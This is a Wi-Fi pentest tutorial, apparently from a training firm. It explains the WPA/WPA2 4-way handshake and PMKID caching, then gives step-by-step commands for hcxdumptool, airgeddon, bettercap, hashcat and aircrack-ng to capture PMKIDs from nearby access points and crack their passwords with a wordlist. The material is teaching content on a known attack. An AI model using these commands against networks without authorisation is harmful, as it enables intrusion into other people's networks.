[[ PAGE 1 ]]
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
[[ PAGE 2 ]]
 
 
 Page 2 of 20 
 
Contents 
Introduction ........................................................................................... 3 
Open System Authentication ................................................................. 3 
Shared Key Authentication .................................................................... 3 
WPA and WPA2 (PSK)............................................................................. 4 
4 Way handshake ................................................................................... 5 
PMK Caching and PMKID ........................................................................ 6 
Explanation of PMKID attack ................................................................. 7 
Capturing PMKID using hcxdumptool .................................................... 7 
Converting pcapng to a hashcat file and cracking using hashcat .......... 9 
Capturing only a single PMKID using hcxdumptool ............................. 11 
Converting pcapng to pcap and cracking using Aircrack-ng ................ 12 
PMKID capture and attack using Airgeddon ........................................ 14 
PMKID capture using bettercap ........................................................... 17 
Conclusion ............................................................................................ 20 
 
 
 
[[ PAGE 3 ]]
 
 
 Page 3 of 20 
 
Introduction 
PMKID attack was developed by Team Hashcat. Traditional handshake capture and brute force methods 
wait for the client to de-authenticate and re-authenticate while PMKID attack doesn’t. Direct PMKID is 
captured in this attack and then cracked. This attack works on WPA and WPA2 protocols and recent 
studies have shown little to no success in WPA3 and are far more resilient to PMKID attacks. Let’s 
understand the basics of Wireless Networks first and then we’d have a better understanding of PMKID. 
Open System Authentication 
Open System Authentication (OSA) is an authentication process through which a computer can gain access 
to a wireless network making use of the Wired Equivalent Privacy (WEP) protocol. With OSA, a computer 
equipped with a wireless modem can access any WEP network and receive unencrypted files. 
Process of authentication: 
 
Client sees an SSID and sends a request to connect (request frame) 
 
Access Point sends a response back (response frame) 
 
Client sends an association or authentication request to AP 
 
AP generates an authentication code and sends it back to the client for use in that session only 
 
 
Figure 1 
Consider when you plug an ethernet cable in your desktop and it connects you right away to the network. 
It is analogous to WEP for wireless networks. Hence, the name is wired equivalent protocol. 
There are obvious issues with this mechanism like decryption of authenticated code, static IV, weak 
encryption used, etc. WEP protocol was enhanced by something known as a Shared Key Authentication. 
Shared Key Authentication 
It is a method of authentication in WEP in which both the client and server have access to a key 
beforehand. This key is nothing but the Wi-Fi passphrase (password). 
So, in the process: 
 
Client sees an SSID and sends a request to connect (request frame) 
[[ PAGE 4 ]]
 
 
 Page 4 of 20 
 
 
Access Point sends an encrypted file to the client that can only be decrypted by the key (Wi-Fi 
Password) 
 
Client enters the password and sends the authentication request frame to AP 
 
AP verifies the decrypted file and confirms that the client has the key used for authentication and 
grants access. 
 
Figure 2 
UC Berkeley proved that WEP is a weak protocol due to encryption happening using that static key and 
hence the advent of WPA and WPA2 
WPA and WPA2 (PSK) 
Pre: We’ll only be talking about PSK authentication here in WPA2 in Unicast mode (AP to client 1 on 1 
communication) 
Wi-Fi protected Access came in 2004 with the ability to work on the same hardware as WEP. Unlike WEP, 
WPA uses TKIP (Temporal Key Integrity Protocol) to dynamically generate a new key for each packet. 
Also, WPA2 includes mandatory support for CCMP protocol, based on AES. Let’s talk about the 
authentication in WPA/WPA2. 
Every user that logs on to a wireless network using WPA and WPA2 PSK methods already knows the Pre-
Shared Key. PSK is 256 bits in size and is derived like this: 
Pre-Shared Key = PBKDF2_SHA1 (Wi-Fi password (passphrase) + Wi-Fi SSID, Length of SSID + 4096 
iterations of SHA1) 
PBKDF2_SHA1 is just an example hash function that can be customized too. 
So, if you tell your Wi-Fi password to your friend, he’ll have access to your PSK as well. Please note that 
PSK doesn’t encrypt the traffic and in fact, the traffic encryption keys are made or derived from this PSK. 
In WPA2 PSK, the Pre-Shared Key is the same as the Pairwise Master Key (PMK). 
This PSK is not used to encrypt data in each packet. Encryption keys are derived from PSK in this method 
and have other variables to them. The encryption key used to encrypt all of the data in transit between a 
client and an Access Point (Unicast) is called a Pairwise Transit Key (PTK). 
So, PTK = PSK or PMK + Anonce + Snonce + MAC (authenticator) and MAC (supplicant) 
Here, 
[[ PAGE 5 ]]
 
 
 Page 5 of 20 
 
 
Authenticator= AP 
 
Supplicant= client 
 
Anonce = 1-time value for each packet generated by the access point called an Authenticator 
nonce 
 
Snonce = 1-time value generated for each packet by the supplicant called a Supplicant nonce. 
Now that we know the formulas for PSK and PTK, let’s see how clients and access points create, exchange, 
and verify these keys using a 4-way handshake. 
Add: For broadcast and multicast modes, basic is the same, the keys generated are a little different. The 
pair then becomes GTK and GMK (Group Temporal Key, Group Master Key), and the PSK in this mode is 
generated from a Master Session Key (MSK). 
4 Way handshake 
In layman terms, while authentication, some source keying material is turned into data encryption 
material which eventually can be used to encrypt data frames. This process of turning source keying 
material into data encryption material is called a 4-way handshake. As we saw above, both the client and 
authenticator (access point) know the PSK (aka PMK). But the PMK is not used to encrypt the data and a 
PTK has to be derived using PMK. 
Let’s understand how a handshake is done now: 
1. Client (aka Supplicant) PTK Creation: 
 
Access Point sends a message with Anonce in it. Anonce is a one-time use value per 
packet. 
 
Client creates its own PTK now that it has all the inputs (both MACs, PMK, Snonce 
(created by self), and Anonce). 
2. AP (aka Authenticator) PTK Creation: 
 
Supplicant sends out a message to AP back with its Snonce so that the AP can 
generate the same PTK as well. 
 
This message is sent with the MIC field set to 1 as a check to verify if this message is 
corrupted or not or if the key has been changed by a man in the middle for some 
other reason. 
 
Supplicant also sends out an RSN IE (or PMKID) 
3. Creation of group keys and transfer by AP to Supplicant: 
 
Once the PTKs are verified, Access Point derives GTK from GMK (For broadcast and 
multicast communication). 
 
GTK is delivered to supplicant which is encrypted with PTK. 
 
The message is sent to the supplicant to install the temporal keys and an RSN IE packet 
is also sent in the frame. 
4. Confirmation of installation of keys: Supplicant confirms to the authenticator that keys have 
been installed. 
[[ PAGE 6 ]]
 
 
 Page 6 of 20 
 
 
Figure 3 
In simpler words, a 4-way handshake does this: 
 
AP sends Anonce to the client and he creates PTK 
 
Client sends Snonce to AP and he creates the same PTK 
 
AP derives Group Keys and sends to Client encrypted with PTK 
 
Supplicant installs the keys and sends confirmation back 
As you can see that this process is rather long and when a client goes out of range and comes back in 
range of the AP (called roaming) the process is lacking inefficiency. This is why routers host a smart 
roaming feature known as PMK caching. 
PMK Caching and PMKID 
Okay, so by this time, the client and Access Point both have done a successful 4-way handshake and 
maintained something known as a PMKSA (PMK security association). 
Access Point roaming refers to a scenario where a client or a supplicant moves outside the range of an AP 
and/or connects to another AP. Very similar to handoffs in cellular networks, this roaming can often take 
a toll on connectivity given every time a client moves out from the range of an AP and moves to other, 4-
way handshake will be done again. 
Consider corporate environments where there are multiple access points on multiple floors and you are 
running with a laptop to the presentation room with an online presentation you made, you open your 
laptop and boom… connection is lost, 1-second lag cost you your entire PPT. 
To make this handoff lag-free, we have a feature called PMK caching. 
Many routers cache PMKID of exchange process in a collection of information PMKSA, so that the next 
time client de and re-authenticates 4-way handshake won’t be done again and the router would directly 
ask the client for PMKSA, verify it and he would be re-associate it back with an access point. 
PMKSA = PMKID + Lifetime of PMK + MAC addresses + other variables 
[[ PAGE 7 ]]
 
 
 Page 7 of 20 
 
PMKID is a hashed value of another hashed value (PMK) with 2 MACs and a fixed string. 
PMKID = HMAC-SHA1-128(PMK, “PMK Name” + MAC (AP) + MAC(Supplicant)) HMAC-SHA1 is again just 
an example of a pseudo-random function. PMKID is a field in the RSN IE frame (Robust Security Network 
Information Element). RSN IE is an optional frame found in routers. “PMK Name” is a fixed string label 
associated with the SSID. Now, this PMKID has cached in the router and the next time my client connects 
to the AP, AP, and client would simply verify this PMKID, and no 4-way handshake regime is required 
again. PMKID caching is done on various IEEE 802.11 networks with roaming features. Many vendors have 
been providing additional RSN security features these days too since the prominence of PMKID attacks is 
increasing. 
Explanation of PMKID attack  
Are all the routers vulnerable to PMKID attacks? No. Only the routers that have roaming features enabled 
or present are vulnerable. 
Now, all that reading will yield fruits. Observe how if we can retrieve the PMKID from an Access Point, 
we’d get a hold of a hashed value containing the password. PMKID attack directly targets a single RSN IE 
frame. Since the PMKID is derived from PMK, a fixed string, and 2 MACs it is defined as an “ideal attack 
vector” by Hashcat. We know now how PMK is created. So, to brute force PMKID, we need the following 
parameters: 
 
WiFi password (passphrase) – guess 
 
WiFi SSID – known 
 
Length of SSID – known 
 
MAC of Authenticator and Supplicant – known 
 
PMK Name – known 
So, we need only: 
Retrieve PMKID -> Guess Wi-Fi passphrase using dictionary -> create PMK hash -> create PMKID hash 
and compare with retrieved PMKID hash  
According to the original Hashcat article here, the main advantages are as follows: 
 
No more regular users required – because the attacker directly communicates with the AP (aka 
“client-less” attack) 
 
No more waiting for a complete 4-way handshake between the regular user and the AP 
 
No more eventual retransmissions of EAPOL frames (which can lead to uncrackable results) 
 
No more eventual invalid passwords sent by the regular user 
 
No more lost EAPOL frames when the regular user or the AP is too far away from the attacker 
 
No more fixing of nonce and replay counter values required (resulting in slightly higher speeds) 
 
No more special output format (pcap, hccapx, etc.) – final data will appear as a regular hex-
encoded string 
Capturing PMKID using hcxdumptool 
Now that we have an understanding of what PMKID is, we’ll try and retrieve this PMKID and try to attack 
it. We are using hcxdumptool to ask the AP for the PMKID frame and save that in a pcapng format. 
 
[[ PAGE 8 ]]
 
 
 Page 8 of 20 
 
To install this along with other tools in the suite: 
 
 
 
After that, we have to put our Wi-Fi adapter or the NIC in monitor mode using aircrack-ng 
 
 
 
Now, we’ll try and capture PMKIDs from all the routers around us using hcx.  
 
 
Here, the demo is the output filewlan0mon is the interface and enable_status 5 means display 
authentication and EAP and EAPOL frames only. PMKID could be captured by status 1 as well.  
EAP Frames: EAP stands for Extensible Authentication Protocol. This protocol is used for authentication 
in WPA2-PSK routers. You see, when we talked about a 4-way handshake, their encryption keys were 
being created. EAP however, is responsible for the authentication of the client to Access Point. 
The EAP process works as follows: 
 
New connection to wireless network requested by the client to AP 
 
The AP asks for identification data from the user and forwards the received data to an 
authentication server. 
 
Authentication server requests and receives proof of the validity of ID information from AP 
apt install hcxtools 
airmon-ng start wlan0 
hcxdumptool -o demo -i wlan0mon --enable_status 5 
[[ PAGE 9 ]]
 
 
 Page 9 of 20 
 
 
Access Point gets verification done from the user and sends verification messages back to the 
authentication server. 
 
Server grants access and the user is connected to the network and further proceeds for a 4-way 
handshake. 
There is a total of 40+ authentication mechanisms in EAP but the gist is as told above.  
 
As you can see, we have captured the PMKID successfully. 
[PMKIDROGUE]: The PMKID is requested by hcxdumptool and not by a CLIENT 
[M1M2ROGUE]: EAPOL M2 is requested from a CLIENT by hcxdumptool and not from an AP. 
[PMKID:<ID> KDV:2]: You captured a PMKID requested from a CLIENT.   
Converting pcapng to a hashcat file and cracking using hashcat 
Now, we’ll use the hcxpcaptool to convert this pcapng file to a Hashcat crackable hash format.  
 
 
hcxpcaptool -z hash demo 
[[ PAGE 10 ]]
 
 
 Page 10 of 20 
 
 
See how PMKIDs are written to the hash. Let us rename this “hash” to “pmkidhash.” Next up is the juicy 
brute force. 
 
 
16800 is the code for WPA PMKID type hash.  
 
And just like that, we have the password figured out.    
hashcat -m 16800 --force pmkidhash /usr/share/wordlists/rockyou.txt --show 
[[ PAGE 11 ]]
 
 
 Page 11 of 20 
 
Capturing only a single PMKID using hcxdumptool 
Now, earlier we were capturing all of the PMKIDs near us, what if we want to capture PMKID from a 
single Access Point? For that, we have to take note of the MAC ID of the AP. Here, from the previous 
hcxdumptool step, I saved the MAC ID in a text file called “target”   
 
 
 
Now, I’ll capture the PMKID and save the output in a file called raj.  
 
 
 
Now the PMKID is saved in a file called “raj”.  
We’ll repeat the steps above and crack the hash using Hashcat  
 
 
 
hcxdumptool -o raj -i wlan0mon --enable_status=1 --filterlist_ap=target --filtermode=2 
hcxpcaptool -z pmkidhash raj 
hashcat -m 16800 --force pmkidhash  /usr/share/wordlists/rockyou.txt --show 
cat target 
[[ PAGE 12 ]]
 
 
 Page 12 of 20 
 
 
 
Converting pcapng to pcap and cracking using Aircrack-ng 
In the demonstration above, we had captured a file called “demo” using hcxdumptool which was a pcapng 
file. Now we’ll convert this to a pcap file and crack right away with aircrack-ng  
 file demo 
tcpdump -r demo -w demo.pcap 
ls 
[[ PAGE 13 ]]
 
 
 Page 13 of 20 
 
 
To crack this, we use the command:  
 
 
And then we type in the target (here, 11)  
 
Worked like a charm   
aircrack-ng demo.pcap -w /usr/share/wordlists/rockyou.txt 
[[ PAGE 14 ]]
 
 
 Page 14 of 20 
 
 
PMKID capture and attack using Airgeddon 
The manual labor and memorization of commands are eased down by airgeddon. Here, using this simple 
CLI we can press some numeric keys and do the same. Let us capture PMKID by running the airgeddon 
script:  
 
Then again press 5 and wait for the script to capture SSIDs around.   
[[ PAGE 15 ]]
 
 
 Page 15 of 20 
 
 
Here, you’ll see a list of targets now. Our target is “Amit 2.4 G” on number 6. Then simply enter the 
timeout you want the script to wait to capture the PMKID. Let’s say 25 seconds are enough.  
 
Sure enough, we can see a PMKID being captured here!   
[[ PAGE 16 ]]
 
 
 Page 16 of 20 
 
 
Then simply store this PMKID as a cap file. First press Y then enter the path and done.   
 
Now, with an integrated aircrack-ng we can crack the cap file within the airgeddon script itself like this: 
Just choose dictionary attack and yes and then the dictionary file.  
[[ PAGE 17 ]]
 
 
 Page 17 of 20 
 
 
Sure enough, we have the password we needed   
 
PMKID capture using bettercap 
For this final method, we will use a good old bettercap. This tool requires an older version of the pcap 
library so, we’ll first download that using wget.  
 
 
wget http://old.kali.org/kali/pool/main/libp/libpcap/libpcap0.8_1.9.1-4_amd64.deb 
dpkg -i libpcap0.8_1.9.1-4_amd64.deb 
[[ PAGE 18 ]]
 
 
 Page 18 of 20 
 
 
Now that it’s installed and our adapter is in monitor mode, we’ll run bettercap 
 
 
 
We’ll see all the APs in range   
 
We’ll display this a little bit more clearly using: 
 
 
bettercap 
set wifi.interface wlan0mon 
wifi.recon on 
wifi.show 
[[ PAGE 19 ]]
 
 
 Page 19 of 20 
 
 
We now need to associate with an access point using the BSSID.  
 
 
As you can see, PMKID is captured now in /root/bettercap-wifi-handshakes.pcap file.   
 
Similarly, if you want to capture PMKID of all the Access Points,  
 
 
 
We now need to convert this pcap file in Hashcat format and crack it as we did before, so:  
 
wifi.assoc 68:14:01:5a:0e:9c 
wifi.assoc all 
hcxpcaptool -z hashpmkid bettercap-wifi-handshake.pcap 
hashcat -m 16800 --force hashpmkid /usr/share/wordlists/rockyou.txt --show 
[[ PAGE 20 ]]
 
 
 Page 20 of 20 
 
 
And that’s how it’s done!  
Conclusion 
PMKID attacks are a big threat to SOHOs and enterprises and necessary steps must be taken in order to 
safeguard yourself against these kinds of low intellect attacks that anyone could perform. It also explains 
the necessity of having a complex password and also, the importance of upgrading to WPA3.  
 
 
 
****************** 
[[ PAGE 21 ]]
JOIN OUR
TRAINING PROGRAMS
www.ignitetechnologies.in
BEGINNER
Network Pentest
Bug Bounty
Wireless Pentest
Network Security
Essentials
Ethical Hacking
ADVANCED
EXPERT
Burp Suite Pro
CTF
Windows
Linux
Pro
Infrastructure VAPT
APT’s - MITRE Attack Tactics
MSSQL Security Assessment
Active Directory Attack
Red Team Operation
Privilege Escalation
Web
Services-API
Android Pentest
Computer
Forensics
Advanced
Metasploit
CLICK HERE
